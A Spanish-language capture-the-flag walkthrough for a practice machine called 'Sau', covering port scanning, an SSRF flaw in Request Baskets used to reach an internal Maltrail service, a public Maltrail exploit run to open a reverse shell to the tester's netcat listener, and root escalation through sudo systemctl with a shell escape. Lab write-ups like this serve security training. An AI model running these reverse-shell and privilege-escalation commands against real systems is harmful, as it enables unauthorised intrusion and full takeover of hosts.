---
description: '✍️ Autor: mrh4sh 🔍 Dificultad: Fácil 📅 Fecha de creación: 30/06/2018'
---

# Sau

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.11.224
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-21 190333.png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.11.224
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-21 190507.png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 22 (SSH)**: El servicio SSH está en ejecución con la versión 8.2p1 de OpenSSH en un sistema Ubuntu. Esta versión es relativamente moderna y es probable que esté actualizada, pero aún es importante revisar posibles vulnerabilidades específicas de esta versión, como debilidades en la configuración del servicio o ataques de fuerza bruta si no se utiliza autenticación de clave pública. El escaneo de las claves del host muestra RSA, ECDSA y ED25519, lo que sugiere que se están utilizando claves modernas, lo que es una buena práctica.
* **Puerto 80 (HTTP)**: El puerto 80 está filtrado, lo que significa que no hay respuesta directa en este puerto desde el escaneo. Podría haber un firewall o una configuración de seguridad que bloquea el tráfico en este puerto, o simplemente podría no estar activo.
* **Puerto 55555 (HTTP)**: Este puerto está abierto y ejecuta un servidor HTTP construido con Golang, como indica la descripción. El título de la página es "Request Baskets" y la solicitud fue redirigida a `/web`, lo que indica que la aplicación web probablemente tenga rutas configuradas para manejar diferentes solicitudes.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80,55555 -v 10.10.11.224
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Reviso el puerto 55555.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Mirando la página nos sale la versión por lo que buscamos si tiene un CVE para explotar.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al realizar una búsqueda en Google, se puede identificar que esta versión es vulnerable a una falla de SSRF (Server Side Request Forgery), CVE-2023-27163, que afecta al componente de la API de Request Baskets, específicamente en el endpoint `/api/baskets/{name}`. Esta vulnerabilidad permite a los atacantes realizar solicitudes manipuladas a la API, lo que les da acceso a recursos internos de la red e información sensible.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Enviamos la petición como se nos indica.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dado que esta versión es vulnerable a SSRF y que el puerto 80 estaba filtrado, lo que nos impedía acceder a él desde el exterior, modificaremos la configuración para redirigir las solicitudes GET hacia el propio localhost del servidor, específicamente al puerto 80. De esta forma, conseguiremos establecer una conexión con los recursos internos del servidor.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Recargamos de nuevo.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Miramos si la versión de **Maltrail** tiene alguna vulnerabilidad por internet.

{% @github-files/github-code-block url="https://github.com/spookier/Maltrail-v0.53-Exploit" %}

Ejecutamos mientras nos ponemos en escucha.

```bash
python3 exploit.py 10.10.14.14 4444 http://10.10.11.224:55555/6ywt1xx/
nc -lvnp 4444
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/systemctl/" %}

```bash
sudo /usr/bin/systemctl status trail.service
!/bin/bash
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-21 195946.png" alt=""><figcaption></figcaption></figure>
